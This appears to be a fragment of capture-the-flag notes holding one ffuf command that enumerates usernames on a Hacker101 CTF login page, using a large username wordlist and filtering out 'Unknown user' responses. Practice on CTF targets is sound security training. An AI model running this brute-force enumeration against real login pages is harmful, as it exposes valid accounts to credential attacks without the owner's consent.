____

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u https://f6db729087b52eecaa6d779ba4692afe.ctf.hacker101.com/login -X POST -d "username=FUZZ&password=invalid" -fr "Unknown user" -H "Content-Type: application/x-www-form-urlencoded"
```